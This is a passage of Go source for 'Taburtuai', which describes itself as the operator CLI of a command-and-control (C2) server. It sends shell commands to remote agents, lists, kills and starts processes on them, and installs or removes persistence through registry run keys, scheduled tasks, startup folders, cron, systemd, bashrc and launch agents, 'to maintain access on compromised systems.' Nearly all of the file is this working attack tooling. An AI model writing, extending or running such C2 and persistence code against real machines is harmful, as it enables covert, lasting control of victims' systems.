		fmt.Println(strings.Repeat("=", 50))
		if agentStats, ok := stats["agents"].(map[string]interface{}); ok {
			fmt.Printf("%sAgent Statistics:%s\n", ColorCyan, ColorReset)
			fmt.Printf("  Total Agents: %.0f\n", getFloatFromMap(agentStats, "total_agents"))
			fmt.Printf("  Online: %s%.0f%s\n", ColorGreen, getFloatFromMap(agentStats, "online_agents"), ColorReset)
			fmt.Printf("  Offline: %s%.0f%s\n", ColorRed, getFloatFromMap(agentStats, "offline_agents"), ColorReset)
			fmt.Printf("  Total Commands Executed (by agents): %.0f\n", getFloatFromMap(agentStats, "total_commands"))
		}
		if serverInfo, ok := stats["server"].(map[string]interface{}); ok {
			fmt.Printf("\n%sServer Information:%s\n", ColorCyan, ColorReset)
			fmt.Printf("  Version: %s\n", getStringFromMap(serverInfo, "version"))
			fmt.Printf("  Uptime: %s\n", getStringFromMap(serverInfo, "uptime"))
		}
		if logStats, ok := stats["logs"].(map[string]interface{}); ok {
			fmt.Printf("\n%sLogging Statistics:%s\n", ColorCyan, ColorReset)
			fmt.Printf("  Total Log Entries (in memory): %.0f\n", getFloatFromMap(logStats, "total_entries"))
		}
		fmt.Println()
	},
}

// Version command
var versionCmd = &cobra.Command{
	Use:   "version",
	Short: "Show CLI version",
	Run: func(cmd *cobra.Command, args []string) {
		fmt.Printf("%sTaburtuai CLI%s\n", ColorGreen, ColorReset)
		fmt.Println("Version: 2.0 - Phase 2 (with File Ops)")
		fmt.Printf("Target Server: %s\n", config.ServerURL)
		apiKeyStatus := "Not Configured"
		if config.APIKey != "" {
			apiKeyStatus = "Configured (hidden)"
		}
		fmt.Printf("API Key: %s\n", apiKeyStatus)
	},
}

var processCmd = &cobra.Command{
	Use:     "process",
	Short:   "Manage processes on an agent",
	Aliases: []string{"proc"},
}

var processListCmd = &cobra.Command{
	Use:   "list <agent-id>",
	Short: "List processes on an agent",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID := args[0]
		printInfo(fmt.Sprintf("Requesting process list from agent %s...", agentID))

		// Buat JSON payload kosong untuk list
		serverRespBytes, err := makeAPIRequestWithMethod("POST", "/api/v1/agent/"+agentID+"/process/list", nil, "application/json")
		if err != nil {
			printError(fmt.Sprintf("Failed to send process list request: %v", err))
			os.Exit(1)
		}

		if verbose {
			printVerbose(fmt.Sprintf("Process list response: %s", string(serverRespBytes)))
		}

		var apiResp APIResponse
		if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil {
			printError(fmt.Sprintf("Failed to parse process list response: %v. Raw: %s", err, string(serverRespBytes)))
			os.Exit(1)
		}

		if !apiResp.Success {
			printError(fmt.Sprintf("Server error: %s", apiResp.Error))
			os.Exit(1)
		}

		// Handle nested response structure
		commandID, err := extractCommandID(apiResp, "process_start")
		if err != nil {
			printError(fmt.Sprintf("Failed to extract command_id: %v", err))
			os.Exit(1)
		}

		printSuccess(fmt.Sprintf("Process list command queued. ID: %s", commandID))

		wait, _ := cmd.Flags().GetBool("wait")
		if wait {
			finalStatusData := waitForCommand(commandID, 60)
			if finalStatusData != nil {
				if statusMap, ok := finalStatusData.(map[string]interface{}); ok {
					output, _ := statusMap["output"].(string)
					if output != "" {
						printInfo("Process List Output from Agent:")
						// Coba parse sebagai JSON jika dari powershell
						var processesInfo []map[string]interface{}
						if errJson := json.Unmarshal([]byte(output), &processesInfo); errJson == nil {
							// Tampilkan dalam format tabel yang lebih bagus jika berhasil diparse
							fmt.Printf("%s%-8s %-25s %-40s %-30s%s\n",
								ColorBlue, "PID", "NAME", "PATH", "DESCRIPTION", ColorReset)
							fmt.Println(strings.Repeat("-", 110))
							for _, p := range processesInfo {
								id := getFloatFromMap(p, "Id")
								name := getStringFromMap(p, "ProcessName")
								path := getStringFromMap(p, "Path")
								desc := getStringFromMap(p, "Description")

								// Truncate long strings
								if len(name) > 24 {
									name = name[:21] + "..."
								}
								if len(path) > 39 {
									path = path[:36] + "..."
								}
								if len(desc) > 29 {
									desc = desc[:26] + "..."
								}

								fmt.Printf("%-8.0f %-25s %-40s %-30s\n", id, name, path, desc)
							}
						} else {
							// Jika bukan JSON atau gagal parse, tampilkan apa adanya
							fmt.Println(output)
						}
					}
				}
			}
		} else {
			printInfo(fmt.Sprintf("Use 'taburtuai-cli status %s' to check.", commandID))
		}
	},
}

var processKillCmd = &cobra.Command{
	Use:   "kill <agent-id>",
	Short: "Kill a process on an agent by PID or name",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID := args[0]
		pid, _ := cmd.Flags().GetInt("pid")
		name, _ := cmd.Flags().GetString("name")

		if pid == 0 && name == "" {
			printError("Either --pid or --name must be specified for kill.")
			return
		}

		payload := make(map[string]interface{})
		targetLog := ""
		if pid != 0 {
			payload["process_id"] = pid
			targetLog = fmt.Sprintf("PID %d", pid)
		} else {
			payload["process_name"] = name
			targetLog = fmt.Sprintf("name '%s'", name)
		}
		printInfo(fmt.Sprintf("Requesting to kill process %s on agent %s...", targetLog, agentID))

		jsonPayload, _ := json.Marshal(payload)
		serverRespBytes, err := makeAPIRequestWithMethod("POST", "/api/v1/agent/"+agentID+"/process/kill", bytes.NewBuffer(jsonPayload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("Request failed: %v", err))
			os.Exit(1)
		}

		if verbose {
			printVerbose(fmt.Sprintf("Process kill response: %s", string(serverRespBytes)))
		}

		var apiResp APIResponse
		if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil {
			printError(fmt.Sprintf("Failed to parse process kill response: %v. Raw: %s", err, string(serverRespBytes)))
			os.Exit(1)
		}

		if !apiResp.Success {
			printError(fmt.Sprintf("Server error: %s", apiResp.Error))
			os.Exit(1)
		}

		commandID, err := extractCommandID(apiResp, "process_kill")
		if err != nil {
			printError(fmt.Sprintf("Failed to extract command_id: %v", err))
			os.Exit(1)
		}

		printSuccess(fmt.Sprintf("Process kill command queued. ID: %s", commandID))

		wait, _ := cmd.Flags().GetBool("wait")
		if wait {
			finalStatusData := waitForCommand(commandID, 30)
			if finalStatusData != nil {
				if statusMap, ok := finalStatusData.(map[string]interface{}); ok {
					status := getStringFromMap(statusMap, "status")
					output := getStringFromMap(statusMap, "output")
					errorMsg := getStringFromMap(statusMap, "error")

					if status == "completed" {
						if output != "" {
							printSuccess(fmt.Sprintf("Process kill completed: %s", output))
						} else {
							printSuccess(fmt.Sprintf("Process %s killed successfully", targetLog))
						}
					} else if status == "failed" {
						if errorMsg != "" {
							printError(fmt.Sprintf("Process kill failed: %s", errorMsg))
						} else {
							printError(fmt.Sprintf("Failed to kill process %s", targetLog))
						}
					}
				}
			}
		} else {
			printInfo(fmt.Sprintf("Use 'taburtuai-cli status %s' to check.", commandID))
		}
	},
}

var processStartCmd = &cobra.Command{
	Use:   "start <agent-id> <process-path>",
	Short: "Start a new process on an agent",
	Args:  cobra.ExactArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		agentID := args[0]
		procPath := args[1]
		procArgs, _ := cmd.Flags().GetString("args")

		printInfo(fmt.Sprintf("Requesting to start process '%s' with args '%s' on agent %s...", procPath, procArgs, agentID))
		payload := map[string]string{
			"process_path": procPath,
			"process_args": procArgs,
		}
		jsonPayload, _ := json.Marshal(payload)
		serverRespBytes, err := makeAPIRequestWithMethod("POST", "/api/v1/agent/"+agentID+"/process/start", bytes.NewBuffer(jsonPayload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("Request failed: %v", err))
			os.Exit(1)
		}

		if verbose {
			printVerbose(fmt.Sprintf("Process start response: %s", string(serverRespBytes)))
		}

		var apiResp APIResponse
		if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil {
			printError(fmt.Sprintf("Failed to parse process start response: %v. Raw: %s", err, string(serverRespBytes)))
			os.Exit(1)
		}

		if !apiResp.Success {
			printError(fmt.Sprintf("Server error: %s", apiResp.Error))
			os.Exit(1)
		}

		commandID, err := extractCommandID(apiResp, "process_list")
		if err != nil {
			printError(fmt.Sprintf("Failed to extract command_id: %v", err))
			os.Exit(1)
		}

		printSuccess(fmt.Sprintf("Process start command queued. ID: %s", commandID))

		wait, _ := cmd.Flags().GetBool("wait")
		if wait {
			finalStatusData := waitForCommand(commandID, 30)
			if finalStatusData != nil {
				if statusMap, ok := finalStatusData.(map[string]interface{}); ok {
					status := getStringFromMap(statusMap, "status")
					output := getStringFromMap(statusMap, "output")
					errorMsg := getStringFromMap(statusMap, "error")

					if status == "completed" {
						if output != "" {
							printSuccess(fmt.Sprintf("Process start completed: %s", output))
						} else {
							printSuccess(fmt.Sprintf("Process '%s' started successfully", procPath))
						}
					} else if status == "failed" {
						if errorMsg != "" {
							printError(fmt.Sprintf("Process start failed: %s", errorMsg))
						} else {
							printError(fmt.Sprintf("Failed to start process '%s'", procPath))
						}
					}
				}
			}
		} else {
			printInfo(fmt.Sprintf("Use 'taburtuai-cli status %s' to check.", commandID))
		}
	},
}

var persistenceCmd = &cobra.Command{
	Use:   "persistence",
	Short: "Manage persistence mechanisms on agents",
	Long:  "Setup or remove persistence mechanisms to maintain access on compromised systems",
}

var persistenceSetupCmd = &cobra.Command{
	Use:   "setup <agent-id>",
	Short: "Setup persistence mechanism on agent",
	Long: `Setup persistence mechanism on the specified agent to maintain access.

Available methods:
  Windows:
    - registry_run: Add to registry run key
    - schtasks_onlogon: Scheduled task on logon
    - schtasks_daily: Daily scheduled task
    - startup_folder: Windows startup folder

  Linux:
    - cron_reboot: Cron job on reboot
    - systemd_user: Systemd user service
    - bashrc: Add to bashrc

  macOS:
    - launchagent: Launch agent plist`,
	Args: cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID := args[0]

		method, _ := cmd.Flags().GetString("method")
		name, _ := cmd.Flags().GetString("name")
		processPath, _ := cmd.Flags().GetString("path")
		processArgs, _ := cmd.Flags().GetString("args")
		wait, _ := cmd.Flags().GetBool("wait")

		// Validate method
		validMethods := map[string]bool{
			// Windows methods
			"registry_run":     true,
			"schtasks_onlogon": true,
			"schtasks_daily":   true,
			"startup_folder":   true,
			// Linux methods
			"cron_reboot":  true,
			"systemd_user": true,
			"bashrc":       true,
			// macOS methods
			"launchagent": true,
		}

		if !validMethods[method] {
			printError("Invalid persistence method. Available methods:")
			printError("Windows: registry_run, schtasks_onlogon, schtasks_daily, startup_folder")
			printError("Linux: cron_reboot, systemd_user, bashrc")
			printError("macOS: launchagent")
			os.Exit(1)
		}

		if processPath == "" {
			printError("--path is required (path to executable for persistence)")
			os.Exit(1)
		}

		printInfo(fmt.Sprintf("Setting up %s persistence '%s' on agent %s...", method, name, agentID))
		printVerbose(fmt.Sprintf("Method: %s, Name: %s, Path: %s, Args: %s", method, name, processPath, processArgs))

		payload := map[string]interface{}{
			"persist_method": method,
			"process_path":   processPath,
		}

		if name != "" {
			payload["persist_name"] = name
		}

		if processArgs != "" {
			payload["process_args"] = processArgs
		}

		jsonPayload, err := json.Marshal(payload)
		if err != nil {
			printError(fmt.Sprintf("Failed to marshal persistence setup payload: %v", err))
			os.Exit(1)
		}

		endpoint := fmt.Sprintf("/api/v1/agent/%s/persistence/setup", agentID)
		serverRespBytes, err := makeAPIRequestWithMethod("POST", endpoint, bytes.NewBuffer(jsonPayload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("Failed to send persistence setup request: %v", err))
			os.Exit(1)
		}

		if verbose {
			printVerbose(fmt.Sprintf("Persistence setup response: %s", string(serverRespBytes)))
		}

		var apiResp APIResponse
		if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil {
			printError(fmt.Sprintf("Failed to parse persistence setup response: %v. Raw: %s", err, string(serverRespBytes)))
			os.Exit(1)
		}

		if !apiResp.Success {
			printError(fmt.Sprintf("Server error during persistence setup: %s", apiResp.Error))
			os.Exit(1)
		}

		// Extract command_id using helper function
		commandID, err := extractCommandID(apiResp, "persistence_setup")
		if err != nil {
			printError(fmt.Sprintf("Failed to extract command_id from persistence setup response: %v", err))
			os.Exit(1)
		}

		// Get persist_name from response if generated by server
		var persistName string
		if apiResp.Data != nil {
			if dataMap, ok := apiResp.Data.(map[string]interface{}); ok {
				if result, hasResult := dataMap["result"].(map[string]interface{}); hasResult {
					if genName, hasName := result["persist_name"].(string); hasName {
						persistName = genName
					}
				} else if genName, hasName := dataMap["persist_name"].(string); hasName {
					persistName = genName
				}
			}
		}

		printSuccess(fmt.Sprintf("Persistence setup command queued. Command ID: %s", commandID))
		if persistName != "" && persistName != name {
			printInfo(fmt.Sprintf("Generated persistence name: %s", persistName))
		}

		if wait {
			printInfo("Waiting for persistence setup to complete...")
			finalStatusData := waitForCommand(commandID, 120) // 2 minutes timeout
			if finalStatusData != nil {
				if statusMap, ok := finalStatusData.(map[string]interface{}); ok {
					status := getStringFromMap(statusMap, "status")
					output := getStringFromMap(statusMap, "output")
					errorMsg := getStringFromMap(statusMap, "error")

					if status == "completed" {
						if output != "" {
							printSuccess(fmt.Sprintf("Persistence setup completed: %s", output))
						} else {
							printSuccess(fmt.Sprintf("Persistence '%s' using method '%s' setup successfully", name, method))
						}
						printInfo("Agent should now survive reboots and maintain access.")
					} else if status == "failed" {
						if errorMsg != "" {
							printError(fmt.Sprintf("Persistence setup failed: %s", errorMsg))
						} else {
							printError(fmt.Sprintf("Failed to setup persistence '%s'", name))
						}
					}
				}
			}
		} else {
			printInfo(fmt.Sprintf("Check status with: taburtuai-cli status %s", commandID))
			printInfo("Test persistence by rebooting the target machine and checking if agent reconnects.")
		}
	},
}

var persistenceRemoveCmd = &cobra.Command{
	Use:   "remove <agent-id>",
	Short: "Remove persistence mechanism from agent",
	Long:  "Remove previously setup persistence mechanism from the specified agent",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID := args[0]

		method, _ := cmd.Flags().GetString("method")
		name, _ := cmd.Flags().GetString("name")
		wait, _ := cmd.Flags().GetBool("wait")

		if method == "" {
			printError("--method is required (same method used during setup)")
			os.Exit(1)
		}

		if name == "" {
			printError("--name is required (same name used during setup)")
			os.Exit(1)
		}

		printInfo(fmt.Sprintf("Removing %s persistence '%s' from agent %s...", method, name, agentID))

		payload := map[string]interface{}{
			"persist_method": method,
			"persist_name":   name,
		}

		jsonPayload, err := json.Marshal(payload)
		if err != nil {
			printError(fmt.Sprintf("Failed to marshal persistence remove payload: %v", err))
			os.Exit(1)
		}

		endpoint := fmt.Sprintf("/api/v1/agent/%s/persistence/remove", agentID)
		serverRespBytes, err := makeAPIRequestWithMethod("POST", endpoint, bytes.NewBuffer(jsonPayload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("Failed to send persistence remove request: %v", err))
			os.Exit(1)
		}

		if verbose {
			printVerbose(fmt.Sprintf("Persistence remove response: %s", string(serverRespBytes)))
		}

		var apiResp APIResponse
		if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil {
			printError(fmt.Sprintf("Failed to parse persistence remove response: %v. Raw: %s", err, string(serverRespBytes)))
			os.Exit(1)
		}

		if !apiResp.Success {
			printError(fmt.Sprintf("Server error during persistence removal: %s", apiResp.Error))
			os.Exit(1)
		}

		// Extract command_id using helper function
		commandID, err := extractCommandID(apiResp, "persistence_remove")
		if err != nil {
			printError(fmt.Sprintf("Failed to extract command_id from persistence remove response: %v", err))
			os.Exit(1)
		}

		printSuccess(fmt.Sprintf("Persistence removal command queued. Command ID: %s", commandID))

		if wait {
			printInfo("Waiting for persistence removal to complete...")
			finalStatusData := waitForCommand(commandID, 120) // 2 minutes timeout
			if finalStatusData != nil {
				if statusMap, ok := finalStatusData.(map[string]interface{}); ok {
					status := getStringFromMap(statusMap, "status")
					output := getStringFromMap(statusMap, "output")
					errorMsg := getStringFromMap(statusMap, "error")

					if status == "completed" {
						if output != "" {
							printSuccess(fmt.Sprintf("Persistence removal completed: %s", output))
						} else {
							printSuccess(fmt.Sprintf("Persistence '%s' using method '%s' removed successfully", name, method))
						}
						printInfo("Agent persistence has been cleaned up.")
					} else if status == "failed" {
						if errorMsg != "" {
							printError(fmt.Sprintf("Persistence removal failed: %s", errorMsg))
						} else {
							printError(fmt.Sprintf("Failed to remove persistence '%s'", name))
						}
					}
				}
			}
		} else {
			printInfo(fmt.Sprintf("Check status with: taburtuai-cli status %s", commandID))
		}
	},
}

// --- HELPER FUNCTIONS ---
func getStringFromMap(m map[string]interface{}, key string) string {
	if val, ok := m[key].(string); ok {
		return val
	}
	return ""
}

func getFloatFromMap(m map[string]interface{}, key string) float64 {
	if val, ok := m[key]; ok {
		if fVal, ok := val.(float64); ok {
			return fVal
		}
	}
	return 0
}

func makeAPIRequest(endpoint string) ([]byte, error) {
	return makeAPIRequestWithMethod("GET", endpoint, nil, "")
}

func makeAPIRequestWithMethod(method, endpoint string, body io.Reader, contentType string) ([]byte, error) {
	fullURL := config.ServerURL + endpoint
	printVerbose(fmt.Sprintf("Making %s request to: %s", method, fullURL))

	req, err := http.NewRequest(method, fullURL, body)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	if config.APIKey != "" {
		req.Header.Set("Authorization", "Bearer "+config.APIKey)
	}
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}

	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response body: %w", err)
	}

	printVerbose(fmt.Sprintf("Response Status: %s", resp.Status))
	if verbose && len(respBody) < 500 { // Jangan print body besar di verbose
		printVerbose(fmt.Sprintf("Response Body: %s", string(respBody)))
	}

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		// Coba parse sebagai APIResponse untuk mendapatkan pesan error server
		var apiErr APIResponse
		if json.Unmarshal(respBody, &apiErr) == nil && apiErr.Error != "" {
			return respBody, fmt.Errorf("server error (status %d): %s", resp.StatusCode, apiErr.Error)
		}
		return respBody, fmt.Errorf("server returned status %s. Body: %s", resp.Status, string(respBody))
	}
	return respBody, nil
}

func executeShellCommand(agentID, commandStr string) {
	printVerbose(fmt.Sprintf("Shell command for %s: %s", agentID, commandStr))
	reqBody := map[string]interface{}{
		"agent_id": agentID,
		"command":  commandStr,
		"timeout":  60,
	}
	reqJSON, _ := json.Marshal(reqBody)
	serverRespBytes, err := makeAPIRequestWithMethod("POST", "/api/v1/command", bytes.NewBuffer(reqJSON), "application/json")
	if err != nil {
		fmt.Printf("%sError sending shell command: %v%s\n", ColorRed, err, ColorReset)
		return
	}

	if verbose {
		printVerbose(fmt.Sprintf("Shell command response: %s", string(serverRespBytes)))
	}

	var apiResp APIResponse
	if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil {
		fmt.Printf("%sError parsing shell command response: %v%s\n", ColorRed, err, ColorReset)
		return
	}

	if !apiResp.Success {
		fmt.Printf("%sError from server: %s%s\n", ColorRed, apiResp.Error, ColorReset)
		return
	}

	// Use helper function for command ID extraction
	commandID, err := extractCommandID(apiResp, "shell")
	if err != nil {
		fmt.Printf("%sFailed to extract command_id: %v%s\n", ColorRed, err, ColorReset)
		return
	}

	finalStatusData := waitForCommand(commandID, 60)
	if finalStatusData != nil {
		if statusMap, ok := finalStatusData.(map[string]interface{}); ok {
			output, _ := statusMap["output"].(string)
			errorMsg, _ := statusMap["error"].(string)
			if output != "" {
				fmt.Print(output)
				if !strings.HasSuffix(output, "\n") {
					fmt.Println()
				}
			}
			if errorMsg != "" {
				fmt.Printf("%s%s%s\n", ColorRed, errorMsg, ColorReset)
			}
		}
	}
}

func waitForCommand(commandID string, timeoutSeconds int) interface{} {
	spinner := []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
	spinIdx := 0
	startTime := time.Now()
	if timeoutSeconds == 0 {
		timeoutSeconds = 300
	}
	maxDuration := time.Duration(timeoutSeconds) * time.Second

	// Start with longer intervals to avoid rate limiting
	pollInterval := 2 * time.Second
	consecutiveErrors := 0

	for time.Since(startTime) < maxDuration {
		statusRespBytes, err := makeAPIRequest(fmt.Sprintf("/api/v1/command/%s/status", commandID))
		if err != nil {
			consecutiveErrors++
			// If rate limited, increase wait time exponentially
			if strings.Contains(err.Error(), "429") || strings.Contains(err.Error(), "Rate limit") {
				waitTime := time.Duration(consecutiveErrors) * 5 * time.Second
				if waitTime > 30*time.Second {
					waitTime = 30 * time.Second
				}
				fmt.Printf("\r%s Rate limited. Waiting %v before retry... %s", ColorYellow, waitTime, ColorReset)
				time.Sleep(waitTime)
				continue
			}

			fmt.Printf("\r%s Error checking status: %v. Retrying in %v... %s\n", ColorRed, err, pollInterval, ColorReset)
			time.Sleep(pollInterval)
			// Increase poll interval on errors
			if pollInterval < 10*time.Second {
				pollInterval += time.Second
			}
			continue
		}

		// Reset error counter and poll interval on success
		consecutiveErrors = 0
		pollInterval = 2 * time.Second

		var statusAPIResp APIResponse
		if err := json.Unmarshal(statusRespBytes, &statusAPIResp); err != nil {
			fmt.Printf("\r%s Error parsing status response. Retrying in %v... %s\n", ColorRed, pollInterval, ColorReset)
			time.Sleep(pollInterval)
			continue
		}

		if !statusAPIResp.Success {
			if strings.Contains(statusAPIResp.Error, "Command not found") {
				fmt.Printf("\r%s Command %s not found. %s\n", ColorRed, commandID, ColorReset)
				return nil
			}
			fmt.Printf("\r%s Server error on status: %s. Retrying in %v... %s\n", ColorRed, statusAPIResp.Error, pollInterval, ColorReset)
			time.Sleep(pollInterval)
			continue
		}

		if statusAPIResp.Data == nil {
			fmt.Printf("\r%s No data in status. Retrying in %v... %s", ColorYellow, pollInterval, ColorReset)
			time.Sleep(pollInterval)
			continue
		}

		// Handle nested response structure for status
		var cmdData map[string]interface{}
		if dataMap, ok := statusAPIResp.Data.(map[string]interface{}); ok {
			// Check for nested result structure first
			if result, hasResult := dataMap["result"].(map[string]interface{}); hasResult {
				cmdData = result
				if verbose {
					printVerbose("Found command status in nested result structure")
				}
			} else {
				// Use direct structure as fallback
				cmdData = dataMap
				if verbose {
					printVerbose("Found command status in direct structure")
				}
			}
		} else {
			fmt.Printf("\r%s Invalid data format in status. Retrying in %v... %s", ColorYellow, pollInterval, ColorReset)
			time.Sleep(pollInterval)
			continue
		}

		status, _ := cmdData["status"].(string)
		fmt.Printf("\r%s Status: %s %s %s", ColorCyan, status, spinner[spinIdx], ColorReset)
		spinIdx = (spinIdx + 1) % len(spinner)

		switch status {
		case "completed", "failed", "timeout":
			fmt.Printf("\r%s Status: %s. Finalizing...                %s\n", ColorGreen, status, ColorReset)
			displayFinalCommandStatus(cmdData, commandID)
			return cmdData
		}

		// Wait before next poll
		time.Sleep(pollInterval)
	}

	fmt.Printf("\r%s Timed out waiting for command %s after %d seconds. %s\n", ColorRed, commandID, timeoutSeconds, ColorReset)
	return nil
}

func displayFinalCommandStatus(cmdData map[string]interface{}, commandID string) {
	status := getStringFromMap(cmdData, "status")
	exitCode := int(getFloatFromMap(cmdData, "exit_code"))
	output := getStringFromMap(cmdData, "output")
	errorMsg := getStringFromMap(cmdData, "error")
	opType := getStringFromMap(cmdData, "operation_type")
	cmdStr := getStringFromMap(cmdData, "command")

	fmt.Printf("%s\n%sFinal Status for Command ID %s (%s: %s):%s\n", strings.Repeat("=", 60), ColorBlue, commandID, opType, cmdStr, ColorReset)
	fmt.Printf("%sStatus:%s ", ColorCyan, ColorReset)
	switch status {
	case "completed":
		fmt.Printf("%s%s%s\n", ColorGreen, status, ColorReset)
	case "failed", "timeout":
		fmt.Printf("%s%s%s\n", ColorRed, status, ColorReset)
	default:
		fmt.Println(status)
	}
	if opType == "execute" { // Exit code lebih relevan untuk execute
		fmt.Printf("%sExit Code:%s %d\n", ColorCyan, ColorReset, exitCode)
	}
	if output != "" {
		fmt.Printf("\n%sOutput:%s\n", ColorGreen, ColorReset)
		// Jangan tampilkan konten file besar secara langsung di sini
		if (opType == "download" && strings.HasPrefix(output, "[File content too large")) || (len(output) > 1024 && opType != "upload") {
			fmt.Println(output) // Pesan dari server sudah cukup
		} else if opType == "upload" {
			fmt.Println(output) // Pesan konfirmasi upload
		} else if len(output) > 1024 {
			fmt.Printf("%s... (Output truncated, %d bytes total)\n", output[:1000], len(output))
		} else {
			fmt.Println(output)
		}
	}
	if errorMsg != "" {
		fmt.Printf("\n%sError:%s\n%s\n", ColorRed, ColorReset, errorMsg)
	}
	fmt.Println(strings.Repeat("=", 60))
}

func printInfo(msg string)    { fmt.Printf("%s[INFO]%s %s\n", ColorBlue, ColorReset, msg) }
func printSuccess(msg string) { fmt.Printf("%s[SUCCESS]%s %s\n", ColorGreen, ColorReset, msg) }
func printWarning(msg string) { fmt.Printf("%s[WARNING]%s %s\n", ColorYellow, ColorReset, msg) }
func printError(msg string)   { fmt.Printf("%s[ERROR]%s %s\n", ColorRed, ColorReset, msg) }
func printVerbose(msg string) {
	if verbose {
		fmt.Printf("%s[DEBUG]%s %s\n", ColorPurple, ColorReset, msg)
	}
}

func extractCommandID(apiResp APIResponse, operation string) (string, error) {
	if verbose {
		printVerbose(fmt.Sprintf("Extracting command_id from %s response", operation))
		printVerbose(fmt.Sprintf("Response success: %v", apiResp.Success))
		printVerbose(fmt.Sprintf("Response data type: %T", apiResp.Data))
		if apiResp.Data != nil {
			printVerbose(fmt.Sprintf("Response data content: %+v", apiResp.Data))
		}
	}

	if apiResp.Data == nil {
		return "", fmt.Errorf("no data in response")
	}

	dataMap, ok := apiResp.Data.(map[string]interface{})
	if !ok {
		return "", fmt.Errorf("data is not a map, got %T", apiResp.Data)
	}

	// Try direct structure first
	if cmdID, hasCmdID := dataMap["command_id"].(string); hasCmdID {
		if verbose {
			printVerbose(fmt.Sprintf("Found command_id in direct structure: %s", cmdID))
		}
		return cmdID, nil
	}

	// Try nested result structure
	if result, hasResult := dataMap["result"].(map[string]interface{}); hasResult {
		if cmdID, hasCmdID := result["command_id"].(string); hasCmdID {
			if verbose {
				printVerbose(fmt.Sprintf("Found command_id in nested result structure: %s", cmdID))
			}
			return cmdID, nil
		}
	}

	// Debug: show available keys
	if verbose {
		keys := make([]string, 0, len(dataMap))
		for k := range dataMap {
			keys = append(keys, k)
		}
		printVerbose(fmt.Sprintf("Available keys in data: %v", keys))

		// Check if there's a nested structure we missed
		for k, v := range dataMap {
			if nestedMap, isMap := v.(map[string]interface{}); isMap {
				nestedKeys := make([]string, 0, len(nestedMap))
				for nk := range nestedMap {
					nestedKeys = append(nestedKeys, nk)
				}
				printVerbose(fmt.Sprintf("Nested keys in '%s': %v", k, nestedKeys))
			}
		}
	}

	return "", fmt.Errorf("command_id not found in response data structure")
}

// Initialize commands
func init() {
	// Global flags
	// Default untuk serverURL diambil dari ENV atau string kosong jika ENV tidak diset.
	// Cobra akan menggunakan nilai default di sini jika flag tidak diberikan & ENV kosong.
	rootCmd.PersistentFlags().StringVarP(&config.ServerURL, "server", "s", os.Getenv("TABURTUAI_SERVER"), "C2 server URL (default \"http://localhost:8080\" if TABURTUAI_SERVER env not set)")
	if config.ServerURL == "" { // Jika ENV kosong, Cobra tidak otomatis set default string kosong ke default flag
		config.ServerURL = "http://localhost:8080" // Set default eksplisit jika ENV kosong
	}
	rootCmd.PersistentFlags().StringVarP(&config.APIKey, "api-key", "k", os.Getenv("TABURTUAI_API_KEY"), "API key for authentication")
	rootCmd.PersistentFlags().IntVarP(&config.Timeout, "timeout", "t", 30, "Request timeout in seconds")
	rootCmd.PersistentFlags().BoolVarP(&verbose, "verbose", "v", false, "Enable verbose output")

	// Add commands to root
	rootCmd.AddCommand(agentsCmd)
	rootCmd.AddCommand(cmdCmd)
	rootCmd.AddCommand(shellCmd)
	rootCmd.AddCommand(statusCmd)
	rootCmd.AddCommand(historyCmd)
	rootCmd.AddCommand(queueCmd)
	rootCmd.AddCommand(filesCmd)
	rootCmd.AddCommand(logsCmd)
	rootCmd.AddCommand(statsCmd)
	rootCmd.AddCommand(versionCmd)
	rootCmd.AddCommand(processCmd)

	// Add subcommands to agents
	agentsCmd.AddCommand(agentsListCmd)
	agentsCmd.AddCommand(agentsInfoCmd)

	// Add subcommands to queue
	queueCmd.AddCommand(queueStatsCmd)
	queueCmd.AddCommand(queueClearCmd)

	// Add subcommands to files
	filesCmd.AddCommand(filesUploadCmd)
	filesCmd.AddCommand(filesDownloadCmd)

	// Add subcommands to process
	processCmd.AddCommand(processListCmd)
	processCmd.AddCommand(processKillCmd)
	processCmd.AddCommand(processStartCmd)

	// Command flags
	cmdCmd.Flags().Int("timeout", 300, "Command timeout in seconds (server default if 0)")
	cmdCmd.Flags().StringP("workdir", "w", "", "Working directory for command")
	cmdCmd.Flags().BoolP("background", "b", false, "Run command in background")

	historyCmd.Flags().IntP("limit", "l", 50, "Number of commands to show")
	historyCmd.Flags().StringP("status", "", "", "Filter by status (completed, failed, etc)")

	logsCmd.Flags().IntP("limit", "l", 100, "Number of log entries to show (server uses 'count')")
	logsCmd.Flags().StringP("level", "", "", "Filter by log level (INFO, WARN, ERROR, DEBUG)")
	logsCmd.Flags().StringP("category", "", "", "Filter by category (SYSTEM, COMMAND_EXEC, AUDIT, etc)")

	filesUploadCmd.Flags().Bool("wait", false, "Wait for the upload to complete on the agent")
	filesDownloadCmd.Flags().Bool("wait", false, "Wait for the download to complete on server")

	// Flags untuk sub-command process:
	processListCmd.Flags().Bool("wait", true, "Wait for the process list to be returned")

	// >>> BAGIAN KRUSIAL UNTUK ERROR ANDA ADA DI SINI <<<
	processKillCmd.Flags().IntP("pid", "p", 0, "Process ID (PID) to kill")
	processKillCmd.Flags().StringP("name", "n", "", "Process name to kill (e.g., notepad.exe)") // Pastikan "--name" dan "-n" benar
	processKillCmd.Flags().Bool("wait", true, "Wait for the kill confirmation")
